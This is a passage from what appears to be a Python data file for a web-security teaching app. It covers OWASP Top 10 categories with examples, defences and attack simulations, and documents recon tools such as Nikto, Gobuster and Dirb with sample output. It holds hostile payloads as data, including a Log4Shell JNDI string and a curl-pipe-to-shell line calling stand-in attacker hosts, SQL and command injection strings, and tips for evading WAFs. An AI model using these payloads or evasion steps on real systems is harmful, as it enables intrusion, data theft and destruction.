        "description": "This new category expands the old 'Vulnerable and Outdated Components' to cover the entire software lifecycle: dependencies, build pipelines, and distribution infrastructure. It reflects attacks like SolarWinds and the xz Utils backdoor[citation:7][citation:14][citation:16].",
        "examples": [
            "Log4Shell (CVE-2021-44228) — Log4j RCE",
            "Compromised npm/pip packages (typosquatting)",
            "Malicious update pushed to a legitimate package",
            "Compromised CI/CD build pipeline",
            "Unaudited transitive dependencies"
        ],
        "real_world": "In 2020, SolarWinds Orion update was compromised — attackers inserted a backdoor into the build. 18,000 customers including US government agencies installed it. Supply chain attacks cost $4.91M on average and take 267 days to identify[citation:7].",
        "payloads": [
            {"payload": "${jndi:ldap://attacker.com/exploit}", "note": "Log4Shell trigger — just being logged causes RCE"},
            {"payload": "npm install malicious-pkg", "note": "Typosquatting / dependency confusion"},
            {"payload": "curl -sSL https://evil.com/install.sh | sh", "note": "Unverified install script"}
        ],
        "defense": [
            "Continuously inventory versions (SBOM)",
            "Subscribe to CVE feeds and security advisories",
            "Automate patching (Dependabot, Renovate)",
            "Sign and verify all updates",
            "Use lockfiles (package-lock.json, pip freeze)"
        ],
        "simulation": [
            {"step": 1, "title": "Dev installs package", "desc": "Runs npm install react-ui-kit", "from": "Dev", "to": "npm", "data": "Package install", "color": "#16a085"},
            {"step": 2, "title": "Typosquat trap", "desc": "Malicious 'react-ui-klit' gets installed", "from": "npm", "to": "Dev Machine", "data": "Postinstall runs", "color": "#f39c12"},
            {"step": 3, "title": "Backdoor runs", "desc": "Script exfiltrates .env + SSH keys", "from": "Package", "to": "Attacker", "data": "Keys sent", "color": "#c0392b"}
        ]
    },
    {
        "rank": "A04",
        "id": "crypto_failures",
        "title": "Cryptographic Failures",
        "icon": "🔓",
        "color": "#9b59b6",
        "severity": "High",
        "summary": "Sensitive data exposed due to weak or missing encryption.",
        "description": "Formerly 'Sensitive Data Exposure'. Focuses on failures related to cryptography — weak algorithms, plaintext storage, missing encryption in transit[citation:5].",
        "examples": [
            "Passwords stored in plaintext or with MD5/SHA1",
            "HTTP instead of HTTPS for login pages",
            "Weak TLS ciphers (SSLv3, TLS 1.0)",
            "Hardcoded encryption keys in source code"
        ],
        "real_world": "In 2017, Equifax exposed 147 million records because they stored unencrypted SSNs. Cost: $1.4 billion in settlements.",
        "payloads": [
            {"payload": "http://example.com/login", "note": "Login over HTTP = password visible"},
            {"payload": "openssl s_client -connect example.com:443", "note": "Check TLS version and ciphers"}
        ],
        "defense": [
            "Use HTTPS everywhere (HSTS header)",
            "Hash passwords with bcrypt, scrypt, or Argon2",
            "Use TLS 1.2+ with strong ciphers",
            "Encrypt data at rest with AES-256"
        ],
        "simulation": [
            {"step": 1, "title": "User logs in", "desc": "Form submitted over HTTP (no TLS)", "from": "User", "to": "Server", "data": "POST /login (plaintext)", "color": "#e74c3c"},
            {"step": 2, "title": "Network sniffing", "desc": "Attacker captures packet", "from": "Wireshark", "to": "Network", "data": "password=secret", "color": "#c0392b"},
            {"step": 3, "title": "Credentials stolen", "desc": "Attacker has full login", "from": "Attacker", "to": "Server", "data": "Logs in as alice", "color": "#e67e22"}
        ]
    },
    {
        "rank": "A05",
        "id": "injection",
        "title": "Injection",
        "icon": "💉",
        "color": "#c0392b",
        "severity": "High",
        "summary": "Untrusted data sent to an interpreter (SQL, LDAP, OS, XPath).",
        "description": "Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. Includes SQL, NoSQL, OS command, LDAP, XPath, and ORM injection[citation:14].",
        "examples": [
            "SQL injection: ' OR '1'='1",
            "Command injection: ; rm -rf /",
            "NoSQL injection: {\"$ne\": null}"
        ],
        "real_world": "In 2015, TalkTalk (UK telecom) lost 157,000 customer records to a SQL injection attack. Fine: £400,000.",
        "payloads": [
            {"payload": "' OR '1'='1' --", "note": "Classic auth bypass in SQL"},
            {"payload": "1; DROP TABLE users; --", "note": "Destructive SQL"},
            {"payload": "127.0.0.1; cat /etc/passwd", "note": "Command injection"}
        ],
        "defense": [
            "Use parameterized queries / prepared statements",
            "Validate and sanitize all input with allowlists",
            "Escape special characters for the target interpreter",
            "Apply least privilege to database accounts"
        ],
        "simulation": [
            {"step": 1, "title": "Normal login", "desc": "User enters 'alice' and 'pass123'", "from": "User", "to": "App", "data": "username=alice", "color": "#27ae60"},
            {"step": 2, "title": "Attacker injects", "desc": "Enters username: admin' OR '1'='1' --", "from": "Attacker", "to": "App", "data": "admin' OR '1'='1' --", "color": "#f39c12"},
            {"step": 3, "title": "Auth bypass!", "desc": "Query returns all rows → login as admin", "from": "DB", "to": "Attacker", "data": "Logged in as admin", "color": "#c0392b"}
        ]
    },
    {
        "rank": "A06",
        "id": "insecure_design",
        "title": "Insecure Design",
        "icon": "🏗️",
        "color": "#8e44ad",
        "severity": "High",
        "summary": "Flaws in the design itself, not implementation.",
        "description": "Focuses on risks related to design and architectural flaws. Calls for threat modeling, secure design patterns, and reference architectures[citation:5].",
        "examples": [
            "Password reset with guessable tokens (4-digit PIN)",
            "No rate limiting on login",
            "Business logic flaw allowing coupons to stack",
            "Cinema booking where you can book seat 0"
        ],
        "real_world": "In 2018, a movie ticket site allowed users to 'buy' a ticket for $0 by intercepting the request and setting the price parameter.",
        "payloads": [
            {"payload": "POST /checkout {price: 0}", "note": "Price manipulation"},
            {"payload": "POST /coupon/apply multiple times", "note": "Stacking discounts"}
        ],
        "defense": [
            "Threat modeling during design phase",
            "Use secure design patterns and frameworks",
            "Implement rate limiting and CAPTCHAs",
            "Server-side validation of all business rules"
        ],
        "simulation": [
            {"step": 1, "title": "User adds item to cart", "desc": "Price: $100", "from": "User", "to": "Cart", "data": "$100", "color": "#27ae60"},
            {"step": 2, "title": "Attacker intercepts", "desc": "Modifies price to 0", "from": "Attacker", "to": "Proxy", "data": "{price: 0}", "color": "#f39c12"},
            {"step": 3, "title": "Server accepts", "desc": "No server-side revalidation!", "from": "Server", "to": "Order", "data": "Free purchase", "color": "#e74c3c"}
        ]
    },
    {
        "rank": "A07",
        "id": "auth_failures",
        "title": "Authentication Failures",
        "icon": "🔑",
        "color": "#2980b9",
        "severity": "High",
        "summary": "Weak login, session, and credential management.",
        "description": "Confirmation of the user's identity, authentication, and session management is critical. Weaknesses allow attackers to compromise passwords, keys, or session tokens[citation:14].",
        "examples": [
            "Credential stuffing (using leaked creds)",
            "Weak passwords accepted (123456)",
            "Session IDs in URL (visible in logs)",
            "No logout / sessions never expire",
            "Missing MFA"
        ],
        "real_world": "In 2022, Uber suffered a breach because an attacker bought stolen credentials on the dark web and the account had no MFA. Full internal network access granted.",
        "payloads": [
            {"payload": "admin / admin", "note": "Default credentials"},
            {"payload": "session=abc in URL", "note": "Session ID in URL"}
        ],
        "defense": [
            "Enable MFA everywhere",
            "Check passwords against Have I Been Pwned",
            "Use secure session tokens (64+ random bytes)",
            "Set HttpOnly, Secure, SameSite cookies"
        ],
        "simulation": [
            {"step": 1, "title": "Credential stuffing", "desc": "Attacker has 1M leaked emails/passwords", "from": "Attacker", "to": "Login", "data": "1M attempts", "color": "#8e44ad"},
            {"step": 2, "title": "0.1% success", "desc": "1000 valid logins found", "from": "Login", "to": "Attacker", "data": "1000 accounts", "color": "#f39c12"},
            {"step": 3, "title": "No MFA blocks", "desc": "All 1000 logins succeed", "from": "Attacker", "to": "Accounts", "data": "Full access", "color": "#c0392b"}
        ]
    },
    {
        "rank": "A08",
        "id": "integrity_failures",
        "title": "Software or Data Integrity Failures",
        "icon": "📝",
        "color": "#16a085",
        "severity": "High",
        "summary": "Unverified updates, deserialization, CI/CD attacks.",
        "description": "Relates to code and infrastructure that doesn't protect against integrity violations. Includes insecure deserialization and CI/CD pipeline compromise[citation:14].",
        "examples": [
            "Downloading updates over HTTP without signature check",
            "Java deserialization (ysoserial)",
            "PHP unserialize() on user input",
            "Compromised CI/CD build"
        ],
        "real_world": "In 2020, SolarWinds Orion update was compromised — attackers inserted a backdoor into the build. 18,000 customers installed it.",
        "payloads": [
            {"payload": "rO0ABXNyAB...", "note": "Java serialized object payload"},
            {"payload": "O:4:\"User\":1:{s:5:\"admin\";b:1;}", "note": "PHP object injection"}
        ],
        "defense": [
            "Sign and verify all updates",
            "Avoid deserialization of untrusted data",
            "Use lockfiles (package-lock.json, pip freeze)"
        ],
        "simulation": [
            {"step": 1, "title": "Dev installs package", "desc": "Runs npm install react-ui-kit", "from": "Dev", "to": "npm", "data": "Package install", "color": "#16a085"},
            {"step": 2, "title": "Typosquat trap", "desc": "Malicious 'react-ui-klit' gets installed", "from": "npm", "to": "Dev Machine", "data": "Postinstall runs", "color": "#f39c12"},
            {"step": 3, "title": "Backdoor runs", "desc": "Script exfiltrates .env + SSH keys", "from": "Package", "to": "Attacker", "data": "Keys sent", "color": "#c0392b"}
        ]
    },
    {
        "rank": "A09",
        "id": "logging_failures",
        "title": "Security Logging & Alerting Failures",
        "icon": "📊",
        "color": "#8e44ad",
        "severity": "Medium",
        "summary": "Attacks go undetected due to missing logs/alerts.",
        "description": "Without logging and monitoring, breaches cannot be detected. Insufficient logging, detection, monitoring, and active response allow attackers to persist. 'Alerting' was explicitly added to the category name in 2025[citation:3][citation:14].",
        "examples": [
            "No alerts on failed login attempts",
            "Logs not retained (deleted after 7 days)",
            "No centralized logging",
            "Stack traces shown to users (info disclosure)"
        ],
        "real_world": "Target breach (2013) — attackers exfiltrated 40 million credit cards over weeks. Firewall alerts were ignored; logs weren't monitored. Total cost: $300 million.",
        "payloads": [
            {"payload": "Multiple 401 responses", "note": "Failed logins — if not alerted, brute force succeeds"},
            {"payload": "403 bursts from one IP", "note": "Directory enumeration"}
        ],
        "defense": [
            "Log all authentication and access control events",
            "Centralize logs (ELK, Splunk, Graylog)",
            "Set up alerts for anomalies",
            "Retain logs for 90+ days"
        ],
        "simulation": [
            {"step": 1, "title": "Attacker starts brute force", "desc": "10,000 login attempts over 3 hours", "from": "Attacker", "to": "Login", "data": "Mass attempts", "color": "#2980b9"},
            {"step": 2, "title": "No alerts fire", "desc": "Logs collected but not monitored", "from": "Login", "to": "Logs", "data": "Silent", "color": "#e67e22"},
            {"step": 3, "title": "Breach successful", "desc": "Attacker gets in — no one notices for weeks", "from": "Attacker", "to": "Internal", "data": "Data exfiltrated", "color": "#c0392b"}
        ]
    },
    {
        "rank": "A10",
        "id": "exceptional_conditions",
        "title": "Mishandling of Exceptional Conditions",
        "icon": "⚠️",
        "color": "#95a5a6",
        "severity": "High",
        "summary": "Poor error handling, logical errors, and failing open.",
        "description": "A brand new category in 2025. It pulls together 24 CWEs related to error handling, failing open, and other logical failures that only show up when something goes wrong at runtime. These are the 'everything was fine until the network glitched' bugs[citation:3][citation:14][citation:18].",
        "examples": [
            "Application crashes and reveals stack trace",
            "Error handling that fails open (allows access when auth check fails)",
            "Null pointer dereference leading to DoS",
            "Race conditions causing inconsistent state"
        ],
        "real_world": "Many real-world incidents stem from unexpected conditions. For example, a system might allow access to a resource if an authentication service times out, instead of denying access (failing open).",
        "payloads": [
            {"payload": "Trigger timeout on auth service", "note": "If app fails open, you bypass authentication"},
            {"payload": "Send malformed input to cause crash", "note": "Stack trace reveals internal paths"}
        ],
        "defense": [
            "Fail securely (fail closed, not open)",
            "Implement proper error handling with generic user messages",
            "Use structured exception handling",
            "Log errors with full context for debugging"
        ],
        "simulation": [
            {"step": 1, "title": "Normal operation", "desc": "App checks user authorization", "from": "User", "to": "App", "data": "Check auth", "color": "#27ae60"},
            {"step": 2, "title": "Auth service times out", "desc": "Backend service is slow or unreachable", "from": "App", "to": "Auth Service", "data": "Timeout", "color": "#f39c12"},
            {"step": 3, "title": "Fails open!", "desc": "App allows access because check failed", "from": "App", "to": "User", "data": "Access granted", "color": "#e74c3c"}
        ]
    }
]
# ==================== WEB RECON TOOLS ====================
WEB_RECON_TOOLS = [
        {
        "id": "nikto",
        "name": "Nikto",
        "icon": "🕵️",
        "color": "#e74c3c",
        "category": "Vulnerability Scanner",
        "tagline": "Comprehensive web server scanner",
        "description": "Nikto is a fast open-source web server scanner that performs comprehensive tests including over 6,700 potentially dangerous files, outdated versions, and version-specific issues.",
        "install": "sudo apt install nikto",
        "common_flags": [
            {"flag": "-h", "desc": "Target host"},
            {"flag": "-p", "desc": "Port (default 80)"},
            {"flag": "-ssl", "desc": "Force SSL/TLS"},
            {"flag": "-o", "desc": "Output file"},
            {"flag": "-F", "desc": "Output format"},
            {"flag": "-Tuning", "desc": "Scan tuning 1-9"}
        ],
        "examples": [
            {
                "title": "Basic Scan",
                "command": "nikto -h http://target.com",
                "explanation": "Runs a full scan against the target using default settings.",
                "output": "- Nikto v2.5.0\n+ Target IP:          93.184.216.34\n+ Target Hostname:    target.com\n+ Target Port:        80\n+ Server: Apache/2.4.29 (Ubuntu)\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ Apache/2.4.29 appears to be outdated.\n+ /admin/: Admin login page/section found.\n+ /backup/: Directory indexing found.\n+ /phpmyadmin/: phpMyAdmin directory found.\n+ /phpinfo.php: PHP info file found.\n+ 8102 requests: 0 error(s) and 12 item(s) reported on remote host\n+ End Time: 2024-01-15 14:24:12 (27 seconds)"
            },
            {
                "title": "Scan with Tuning",
                "command": "nikto -h https://target.com -ssl -Tuning 1234",
                "explanation": "Tuning limits the scan to interesting files, misconfigs, info disclosure, and injection.",
                "output": "- Nikto v2.5.0\n+ Target Hostname:    target.com\n+ Target Port:        443\n+ SSL Info:           Ciphers: ECDHE-RSA-AES256-GCM-SHA384\n+ Tuning:             1234\n+ /admin/: Admin login page/section found.\n+ /phpinfo.php: PHP info file found - reveals PHP version, modules, paths\n+ /uploads/: Directory indexing found.\n+ /api/: API endpoints exposed.\n+ 4523 requests: 0 error(s) and 4 item(s) reported on remote host"
            }
        ],
        "failures": [
            {
                "title": "Target Not Reachable",
                "command": "nikto -h http://nonexistent.com",
                "explanation": "Host doesn't resolve or is down.",
                "output": "- Nikto v2.5.0\n+ ERROR: Unable to connect to target\n+ Could not resolve hostname: nonexistent.com\n\n[!] Check:\n  * Is the target online? ping nonexistent.com\n  * DNS resolution working? nslookup nonexistent.com\n  * Firewall blocking?"
            },
            {
                "title": "WAF Blocking Scan",
                "command": "nikto -h https://protected.com",
                "explanation": "Cloudflare/AWS WAF detects the aggressive scanning pattern and blocks it.",
                "output": "- Nikto v2.5.0\n+ Target: protected.com\n+ Server: cloudflare\n+ 0 requests completed - host appears to be blocking scans\n+ Multiple 403 Forbidden responses received\n\n[!] WAF detected!\n  * Slow down: nikto -h target -Tuning 1 -timeout 10\n  * Use a proxy: nikto -h target -useproxy http://proxy:8080\n  * Rotate User-Agent\n  * Or the WAF has blocked your IP"
            }
        ],
        "simulation": [
            {"step": 1, "title": "DNS resolve", "desc": "Nikto resolves target hostname", "from": "Nikto", "to": "DNS", "data": "target.com to 93.184.216.34", "color": "#e74c3c"},
            {"step": 2, "title": "Banner grab", "desc": "Fetch / and read Server header", "from": "Nikto", "to": "Web Server", "data": "Apache/2.4.29", "color": "#3498db"},
            {"step": 3, "title": "Test signatures", "desc": "Over 6,700 tests for files, headers, vulnerabilities", "from": "Nikto", "to": "Target", "data": "Bulk requests", "color": "#f39c12"},
            {"step": 4, "title": "Report findings", "desc": "Formats results including missing headers and exposed files", "from": "Target", "to": "Nikto", "data": "12 findings", "color": "#27ae60"}
        ]
    },
    {
        "id": "wafw00f",
        "name": "Wafw00f",
        "icon": "🛡️",
        "color": "#3498db",
        "category": "WAF Detection",
        "tagline": "Web Application Firewall Fingerprinter",
        "description": "Wafw00f identifies and fingerprints Web Application Firewalls (WAFs) by sending normal and malicious HTTP requests and analyzing responses.",
        "install": "pip install wafw00f",
        "common_flags": [
            {"flag": "-a", "desc": "Test all WAF signatures (may take longer)"},
            {"flag": "-l", "desc": "List all detectable WAFs"},
            {"flag": "-v", "desc": "Verbose output"},
            {"flag": "-o", "desc": "Output file"},
            {"flag": "-f", "desc": "Format (json, csv, txt)"}
        ],
        "examples": [
            {
                "title": "Basic WAF Detection",
                "command": "wafw00f https://target.com",
                "explanation": "Sends benign + malicious requests and identifies the WAF based on response patterns.",
                "output": """                ______
               /      \\
              (  Woof!  )
               \\______/
           ~~~~~~ wafw00f ~~~~~~

[*] Checking https://target.com
[+] The site https://target.com is behind Cloudflare (Cloudflare Inc.) WAF.
[+] Number of requests: 5""",
                "category": "Basic"
            },
            {
                "title": "Test All Signatures",
                "command": "wafw00f -a https://target.com",
                "explanation": "Tests against all ~80 WAF signatures — more thorough but slower.",
                "output": """[*] Checking https://target.com
[+] The site https://target.com is behind Cloudflare WAF.
[*] Generic detection results:
    [+] Detected: Cloudflare
    [+] Detected: Akamai Ghost
[+] Number of requests: 47""",
                "category": "Thorough"
            }
        ],
        "failures": [
            {
                "title": "No WAF Detected",
                "command": "wafw00f https://unprotected.com",
                "explanation": "Site is not behind a known WAF or obfuscates the signature.",
                "output": """[*] Checking https://unprotected.com
[-] No WAF detected by the generic detection
[-] Number of requests: 7

⚠️ Either no WAF OR the WAF is custom/unknown.
   Continue recon carefully — you may be visible in logs."""
            }
        ],
        "simulation": [
            {"step": 1, "title": "Benign request", "desc": "Sends normal GET /", "from": "Wafw00f", "to": "Target", "data": "GET / HTTP/1.1", "color": "#3498db"},
            {"step": 2, "title": "Malicious probe", "desc": "Sends simulated XSS/SQLi payload", "from": "Wafw00f", "to": "Target", "data": "GET /?x=<script>", "color": "#e74c3c"},
            {"step": 3, "title": "Analyze responses", "desc": "Compares status codes, headers, cookies", "from": "Target", "to": "Wafw00f", "data": "403 + cf-ray", "color": "#f39c12"},
            {"step": 4, "title": "Identify WAF", "desc": "Matches signature against database", "from": "Wafw00f", "to": "Database", "data": "Cloudflare", "color": "#27ae60"}
        ]
    },
    {
        "id": "whatweb",
        "name": "WhatWeb",
        "icon": "🔍",
        "color": "#f39c12",
        "category": "Fingerprinting",
        "tagline": "Web Technology Fingerprinter",
        "description": "WhatWeb identifies websites' technologies — CMS, JavaScript libraries, web servers, analytics platforms, and more — through aggressive or stealthy scanning.",
        "install": "sudo apt install whatweb",
        "common_flags": [
            {"flag": "--aggression", "desc": "Level 1-4 (1=passive, 3=aggressive default, 4=heavy)"},
            {"flag": "-v", "desc": "Verbose"},
            {"flag": "--log-json", "desc": "Output JSON"},
            {"flag": "-a 4", "desc": "Aggressive mode with brute-forcing"}
        ],
        "examples": [
            {
                "title": "Basic Fingerprint",
                "command": "whatweb https://target.com",
                "explanation": "Identifies the tech stack — server, CMS, frameworks, libraries.",
                "output": """https://target.com [200 OK] Apache[2.4.41],
  Bootstrap[4.5.2],
  Country[UNITED STATES][US],
  HTML5,
  HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)],
  IP[93.184.216.34],
  JQuery[3.5.1],
  Meta-Author[John Doe],
  Open-Graph-Protocol[website],
  PHP[7.4.3],
  Script[text/javascript],
  Title[Welcome to Target - Homepage],
  WordPress[5.8.1],
  WordPress-Plugin[contact-form-7:5.4.1],
  X-Powered-By[PHP/7.4.3]""",
                "category": "Basic"
            },
            {
                "title": "Aggressive Mode",
                "command": "whatweb -a 4 https://target.com",
                "explanation": "Level 4 aggression — makes many requests, tries more detections (may trigger alerts).",
                "output": """https://target.com [200 OK] Apache[2.4.41],
  Bootstrap[4.5.2],
  Cookies[wordpress_test_cookie, wp-settings-1],
  WordPress[5.8.1],
  WordPress-Plugin[contact-form-7:5.4.1, elementor:3.5.6, woocommerce:5.9.0],
  WordPress-Theme[astra:3.7.9],
  WordPress-UserEnum[admin, editor, author1]  ← usernames leaked!""",
                "category": "Aggressive"
            }
        ],
        "failures": [
            {
                "title": "Connection Refused",
                "command": "whatweb https://target.com:9999",
                "explanation": "Port not open or service not running.",
                "output": """ERROR Opening: https://target.com:9999 - Connection refused

⚠️ Check:
  • Is the port open? nmap -p 9999 target.com
  • Correct protocol? (http vs https)
  • Firewall blocking?
"""
            },
            {
                "title": "Detection Blocked",
                "command": "whatweb https://cloudflare-site.com",
                "explanation": "Cloudflare hides origin tech behind its proxy.",
                "output": """https://cloudflare-site.com [200 OK] Cloudflare,
  Country[UNITED STATES][US],
  HTTPServer[cloudflare],
  IP[104.16.x.x],
  X-Powered-By[Express]

⚠️ Cloudflare is masking the real tech stack.
   The 'Express' header is the only leak — many detections blocked."""
            }
        ],
        "simulation": [
            {"step": 1, "title": "GET request", "desc": "Fetch home page", "from": "WhatWeb", "to": "Target", "data": "GET / HTTP/1.1", "color": "#f39c12"},
            {"step": 2, "title": "Parse headers", "desc": "Reads Server, X-Powered-By, Set-Cookie", "from": "Target", "to": "WhatWeb", "data": "Apache, PHP", "color": "#3498db"},
            {"step": 3, "title": "Match patterns", "desc": "Looks for known signatures in HTML", "from": "WhatWeb", "to": "DB", "data": "WordPress 5.8.1", "color": "#e74c3c"},
            {"step": 4, "title": "Report stack", "desc": "Combines all findings", "from": "WhatWeb", "to": "Output", "data": "Full tech stack", "color": "#27ae60"}
        ]
    },
    {
        "id": "gobuster",
        "name": "Gobuster",
        "icon": "📂",
        "color": "#27ae60",
        "category": "Directory/Subdomain Brute",
        "tagline": "Fast directory & DNS brute-forcer",
        "description": "Gobuster is a fast, multithreaded brute-forcing tool written in Go. It discovers hidden directories, files, DNS subdomains, virtual hosts, S3 buckets, and more.",
        "install": "sudo apt install gobuster",
        "common_flags": [
            {"flag": "dir", "desc": "Directory/file brute-force mode"},
            {"flag": "dns", "desc": "DNS subdomain brute-force"},
            {"flag": "vhost", "desc": "Virtual host discovery"},
            {"flag": "s3", "desc": "AWS S3 bucket enumeration"},
            {"flag": "-w", "desc": "Wordlist path"},
            {"flag": "-u", "desc": "Target URL"},
            {"flag": "-t", "desc": "Threads (default 10)"},
            {"flag": "-x", "desc": "Extensions (php,html,txt)"},
            {"flag": "-k", "desc": "Skip TLS verification"},
            {"flag": "-o", "desc": "Output file"}
        ],
        "examples": [
            {
                "title": "Directory Brute Force",
                "command": "gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -t 30",
                "explanation": "Tries every word in the list as a directory/file path.",
                "output": """===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://target.com
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 178] [--> https://target.com/admin/]
/api                  (Status: 200) [Size: 4523]
/backup               (Status: 403) [Size: 287]
/css                  (Status: 301) [Size: 178]
/dashboard            (Status: 302) [Size: 0] [--> /login]
/images               (Status: 301) [Size: 178]
/index.php            (Status: 200) [Size: 12453]
/js                   (Status: 301) [Size: 178]
/login                (Status: 200) [Size: 2845]
/phpinfo.php          (Status: 200) [Size: 94234]
/robots.txt           (Status: 200) [Size: 156]
/uploads              (Status: 301) [Size: 178]

===============================================================
Finished
===============================================================""",
                "category": "Directory"
            },
            {
                "title": "Directory with Extensions",
                "command": "gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,html,txt,bak -t 30",
                "explanation": "Appends extensions to each word — catches index.php.bak, config.txt, etc.",
                "output": """===============================================================
[+] Url:     https://target.com
[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
[+] Extensions: php,html,txt,bak
===============================================================
/config.php          (Status: 200) [Size: 1523]
/config.php.bak      (Status: 200) [Size: 1687]  ← BACKUP EXPOSED!
/index.php           (Status: 200) [Size: 12453]
/setup.sql           (Status: 200) [Size: 45320]  ← DATABASE DUMP!
===============================================================
Finished""",
                "category": "Extended"
            },
            {
                "title": "DNS Subdomain Brute",
                "command": "gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50",
                "explanation": "Finds subdomains — often forgotten and less secured.",
                "output": """===============================================================
[+] Domain:     target.com
[+] Wordlist:   subdomains-top1million-5000.txt
[+] Threads:    50
===============================================================
Found: admin.target.com
Found: api.target.com
Found: dev.target.com     ← dev environment often has bugs
Found: mail.target.com
Found: staging.target.com ← staging often mirrors prod
Found: test.target.com
Found: vpn.target.com
Found: www.target.com
===============================================================
Finished""",
                "category": "DNS"
            }
        ],
        "failures": [
            {
                "title": "WAF Blocking",
                "command": "gobuster dir -u https://cloudflare-site.com -w common.txt -t 50",
                "explanation": "Too many threads trigger WAF. All responses become 403.",
                "output": """===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Error: the server returns a status code that matches the provided options for non existing urls.
https://cloudflare-site.com/abc123 => 403 (Length: 152)

⚠️ WAF detected!
  • All responses are 403 — Cloudflare blocking
  • Reduce threads: -t 5
  • Add delay: --delay 500ms
  • Use a different User-Agent: -a "Mozilla/5.0..."
  • Rotate IPs via proxy"""
            },
            {
                "title": "Wordlist Not Found",
                "command": "gobuster dir -u https://target.com -w /wrong/path/list.txt",
                "explanation": "Wordlist file doesn't exist.",
                "output": """Error: error on parsing arguments: wordlist file "/wrong/path/list.txt" does not exist

⚠️ Common wordlist locations:
  • /usr/share/wordlists/dirb/common.txt
  • /usr/share/seclists/Discovery/Web-Content/
  • /usr/share/wordlists/dirbuster/
  Install: sudo apt install seclists"""
            }
        ],
        "simulation": [
            {"step": 1, "title": "Load wordlist", "desc": "Reads wordlist into memory", "from": "Gobuster", "to": "File", "data": "4614 words loaded", "color": "#27ae60"},
            {"step": 2, "title": "Spawn workers", "desc": "Creates 30 goroutines", "from": "Gobuster", "to": "Workers", "data": "30 threads", "color": "#3498db"},
            {"step": 3, "title": "Parallel requests", "desc": "Each worker tests /word URLs", "from": "Workers", "to": "Target", "data": "GET /admin, /api...", "color": "#f39c12"},
            {"step": 4, "title": "Filter by status", "desc": "Records non-404 responses", "from": "Target", "to": "Gobuster", "data": "200, 301, 403", "color": "#e74c3c"},
            {"step": 5, "title": "Report", "desc": "Prints found paths with status", "from": "Gobuster", "to": "Terminal", "data": "14 dirs found", "color": "#27ae60"}
        ]
    },
    {
        "id": "dirb",
        "name": "Dirb",
        "icon": "📁",
        "color": "#16a085",
        "category": "Directory Brute",
        "tagline": "Classic web content scanner",
        "description": "Dirb is a classic web content scanner that brute-forces directories using a predefined wordlist. Simpler than gobuster but still effective.",
        "install": "sudo apt install dirb",
        "common_flags": [
            {"flag": "-r", "desc": "Non-recursive"},
            {"flag": "-z", "desc": "Delay between requests (ms)"},
            {"flag": "-X", "desc": "Extensions (.php,.html)"},
            {"flag": "-o", "desc": "Output file"},
            {"flag": "-S", "desc": "Silent mode"},
            {"flag": "-w", "desc": "Don't stop on WARNING"}
        ],
        "examples": [
            {
                "title": "Basic Scan",
                "command": "dirb https://target.com",
                "explanation": "Uses default wordlist (/usr/share/dirb/wordlists/common.txt).",
                "output": """-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Mon Jan 15 14:23:45 2024
URL_BASE: https://target.com/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: https://target.com/ ----
+ https://target.com/admin (CODE:301|SIZE:178)
+ https://target.com/api (CODE:200|SIZE:4523)
+ https://target.com/backup (CODE:403|SIZE:287)
==> DIRECTORY: https://target.com/css/
+ https://target.com/index.php (CODE:200|SIZE:12453)
+ https://target.com/login (CODE:200|SIZE:2845)
+ https://target.com/robots.txt (CODE:200|SIZE:156)

-----------------
END_TIME: Mon Jan 15 14:24:32 2024
DOWNLOADED: 4612 - FOUND: 7""",
                "category": "Basic"
            },
            {
                "title": "With Extensions",
                "command": "dirb https://target.com -X .php,.bak,.txt",
                "explanation": "Tries each word with those extensions appended.",
                "output": """GENERATED WORDS: 4612

---- Scanning URL: https://target.com/ ----
+ https://target.com/config.php (CODE:200|SIZE:1523)
+ https://target.com/config.php.bak (CODE:200|SIZE:1687)  ← BACKUP!
+ https://target.com/index.php (CODE:200|SIZE:12453)
+ https://target.com/setup.sql (CODE:200|SIZE:45320)  ← DB DUMP!

DOWNLOADED: 13836 - FOUND: 12""",
                "category": "Extended"
            }
        ],
        "failures": [
            {
                "title": "Server Blocking",
                "command": "dirb https://cloudflare-site.com",
                "explanation": "WAF blocks the scan after a few requests.",
                "output": """---- Scanning URL: https://cloudflare-site.com/ ----
+ https://cloudflare-site.com/admin (CODE:403|SIZE:152)
+ https://cloudflare-site.com/api (CODE:403|SIZE:152)
+ https://cloudflare-site.com/backup (CODE:403|SIZE:152)
...

⚠️ Every response is 403!
   WAF has detected the scan.

   Try:
   • Delay: dirb https://target -z 1000
   • Rotate User-Agent: -a "Mozilla/5.0..."
   • Route through proxy: -p http://proxy:8080"""
            }
        ],
        "simulation": [
            {"step": 1, "title": "Load wordlist", "desc": "Reads /usr/share/dirb/wordlists/common.txt", "from": "Dirb", "to": "File", "data": "4612 words", "color": "#16a085"},
            {"step": 2, "title": "Sequential requests", "desc": "Tests one URL at a time", "from": "Dirb", "to": "Target", "data": "GET /admin", "color": "#3498db"},
            {"step": 3, "title": "Record hits", "desc": "Logs 200, 301, 403 responses", "from": "Target", "to": "Dirb", "data": "+ /admin (301)", "color": "#f39c12"},
            {"step": 4, "title": "Report", "desc": "Summary at the end", "from": "Dirb", "to": "Terminal", "data": "FOUND: 7", "color": "#27ae60"}
        ]
    },
    {
        "id": "dirsearch",
        "name": "Dirsearch",
        "icon": "🗂️",
        "color": "#8e44ad",
        "category": "Directory Brute",
        "tagline": "Advanced web path scanner",
        "description": "Dirsearch is an advanced command-line tool designed to brute-force directories and files in web servers. Has recursive scanning, extension handling, and rich reporting.",
        "install": "pip3 install dirsearch",
        "common_flags": [
            {"flag": "-u", "desc": "Target URL"},
            {"flag": "-e", "desc": "Extensions (php,html,js)"},
            {"flag": "-w", "desc": "Custom wordlist"},
